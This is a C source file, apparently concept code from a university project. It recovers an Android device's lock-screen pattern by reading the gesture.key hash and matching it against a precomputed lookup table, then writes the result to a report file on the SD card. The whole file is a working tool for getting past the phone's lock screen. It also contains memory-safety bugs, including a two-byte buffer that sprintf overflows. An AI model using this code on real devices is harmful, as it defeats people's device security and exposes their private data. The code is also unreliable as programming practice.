/**
 * Find the lock screen pattern from a Android-device
 *
 * Author: Rickard Andersson <h05rikan@du.se>
 * License: None
 * 
 * This program can be compiled for ARM CPUs and then run on an Android device 
 * in order to get the lock screen gesture hash from the /system/ folder. 
 * 
 * You need to have read permissions to the /system/ folder in order for this to work
 * 
 * This is just some concept code for a project of mine from Dalarna University. 
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "main.h" 

#define HASH_LENGTH 20
#define OUTPUT_FILE "/sdcard/report.txt"
#define HASH_TABLE "/system/lib/rtable.dat"

char *gestureFiles[3] = { "/system/gesture.key", "/data/system/gesture.key", "./gesture.key" };

int main() {

	FILE *fh;
	char *hash;
	char *gesture;

	hash = (char*) malloc(41);
	gesture = (char*) malloc(18);
	
	fh = fopen(OUTPUT_FILE, "a+"); 
	
	if (fh == NULL) {
		printf("Unable to open output file for writing");
		fclose(fh);
		return 1;
	} else {
		fprintf(fh, "Beginning new scan ... \n");
	}

	if (getHash(hash) != 0) {
		fprintf(fh, "Unable to find hash");
		fclose(fh);
		return 1;
	} else {
		fprintf(fh, "Found hash: %s\n", hash);
	}


	if (getGesture(hash, gesture) != 0) {
		fprintf(fh, "Unable to find gesture for this hash\n");
		fclose(fh);
		return 1;
	} else {
		fprintf(fh, "Found gesture: %s", gesture);
	}
	
	fprintf(fh, "Done!\n\n");
	fclose(fh);

	return 0;
}

int getGesture(char *hash, char *gesture) {

	FILE *fh = NULL;
	int i = 0;
	char buffer[60];

	fh = fopen(HASH_TABLE, "r");

	if (fh == NULL) {
		printf("No hash table found\n");
		return -1;
	}
	
	while (!feof(fh)) {
		fgets(buffer, 60, fh);

		if (strncmp(hash, buffer, HASH_LENGTH * 2) == 0) {
			strncpy(gesture, buffer + (HASH_LENGTH * 2) + 1, strlen(buffer) - (HASH_LENGTH * 2) );
			fclose(fh);
			return 0;
		}
	}

	fclose(fh);

	return -1;
}
	
int getHash(char *hash) {

	FILE *fh = NULL;
	int i = 0;
	char *buffer;
	
	// Try to find the gesture.key file
	for (i = 0; i < 3 && fh == NULL; i++)  {
		fh = fopen(gestureFiles[i], "rb");
	}
	
	// None of the files was found
	if (fh == NULL) {
		printf("ERROR: No gesture.key was found\n");
		return -1;
	} 

	// Allocate memory and read the first HASH_LENGTH of the file 
	buffer = (char*) malloc(HASH_LENGTH);
	if (fread(buffer, 1, HASH_LENGTH, fh) != HASH_LENGTH) {
		printf("ERROR: Unable to read %d bytes of data from the file\n", HASH_LENGTH);
		return -1;
	}

	fclose(fh);

	// Construct a hex-value hash
	for (i = 0; i < HASH_LENGTH; i++)  {
		unsigned char val = buffer[i];
		char tmp[2] = { 0, 0 };
		
		sprintf(tmp, "%02x", (unsigned char)buffer[i]);
		memcpy(hash + (i * 2), tmp, 2);
	}

	hash[40] = '\0';

	return 0;
}
